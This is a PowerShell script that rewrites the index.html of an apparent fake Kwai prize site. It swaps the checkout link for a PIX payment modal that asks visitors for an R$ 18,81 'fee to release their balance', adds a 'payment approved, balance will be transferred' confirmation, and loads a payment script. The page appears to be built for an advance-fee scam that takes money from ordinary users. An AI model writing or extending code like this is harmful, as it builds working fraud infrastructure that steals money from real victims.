$ErrorActionPreference = "Stop"
$htmlPath = "c:\Meus Sites\KWAI\contapremiada.fun\index.html"
$html = [System.IO.File]::ReadAllText($htmlPath, [System.Text.Encoding]::UTF8)

# 1. Update checkout button
$oldButton = '<a href="https://seguropagamentos.com.br/kwaibrasil" target="_self" class="w-full h-[56px] bg-pink text-white font-bold text-[16px] rounded-[14px] flex items-center justify-center gap-2 no-underline" style="box-shadow:0 4px 14px rgba(255,80,0,0.3); text-decoration:none;">'
$newButton = '<a href="#" id="btn-checkout-pix" class="w-full h-[56px] bg-pink text-white font-bold text-[16px] rounded-[14px] flex items-center justify-center gap-2 no-underline" style="box-shadow:0 4px 14px rgba(255,80,0,0.3); text-decoration:none;">'
$html = $html.Replace($oldButton, $newButton)

# 2. Add Modal HTML at the end of #screens (before </main>)
$modalHtml = @"
    <!-- PAYMENT MODAL -->
    <section id="payment-modal" class="screen" aria-hidden="true">
      <div class="modal-inner" role="dialog" aria-modal="true">
        <div class="popup" style="padding: 20px; text-align: center;">
          <img src="https://i.pinimg.com/736x/0b/a2/5e/0ba25e9fce2ac76f56ee81af302a0f2c.jpg" alt="Kwai" style="width: 50px; border-radius: 10px; margin-bottom: 10px;" />
          <h2 style="font-size: 18px; margin-bottom: 5px; color: #333;">Pagamento via PIX</h2>
          <p style="font-size: 13px; color: #666; margin-bottom: 20px;">Efetue o pagamento da taxa para liberar seu saldo.</p>
          
          <div id="payment-loading" style="display: block;">
            <p>Gerando código PIX...</p>
          </div>

          <div id="payment-details" style="display: none;">
            <img id="pix-qrcode" src="" alt="QR Code" style="width: 200px; height: 200px; margin: 0 auto 15px auto; border: 1px solid #ddd; border-radius: 8px;" />
            <p style="font-size: 14px; font-weight: bold; color: #FF5000;">R$ 18,81</p>
            <input type="text" id="pix-code" readonly style="width: 100%; padding: 10px; font-size: 12px; border: 1px solid #ddd; border-radius: 8px; margin-bottom: 15px; color: #666; text-align: center;" />
            <button id="btn-copy-pix" style="width: 100%; background: #FF5000; color: white; border: none; padding: 15px; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer;">
              COPIAR CÓDIGO PIX
            </button>
            <p id="copy-msg" style="color: #10B981; font-size: 12px; margin-top: 10px; display: none;">Código copiado!</p>
            <p style="font-size: 12px; color: #999; margin-top: 15px;">Aguardando pagamento...</p>
          </div>

          <div id="payment-success" style="display: none;">
            <div style="color: #10B981; font-size: 40px; margin-bottom: 10px;">✓</div>
            <h3 style="color: #10B981; margin-bottom: 10px;">Pagamento Aprovado!</h3>
            <p style="font-size: 14px; color: #666; margin-bottom: 20px;">Seu saldo foi liberado e será transferido para sua conta.</p>
            <button id="btn-finish" style="width: 100%; background: #10B981; color: white; border: none; padding: 15px; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer;">
              ACESSAR MEU SALDO
            </button>
          </div>
          
          <button data-modal-close style="margin-top: 20px; background: none; border: none; color: #999; text-decoration: underline; cursor: pointer;">Fechar</button>
        </div>
      </div>
    </section>
"@

# Insert modal before </main>
$html = $html.Replace('</main>', "$modalHtml`n  </main>")

# 3. Insert script at the very end before </body>
$scriptTag = '<script src="js/payment.js"></script>'
$html = $html.Replace('</body>', "$scriptTag`n</body>")

[System.IO.File]::WriteAllText($htmlPath, $html, [System.Text.Encoding]::UTF8)
Write-Output "index.html updated successfully."
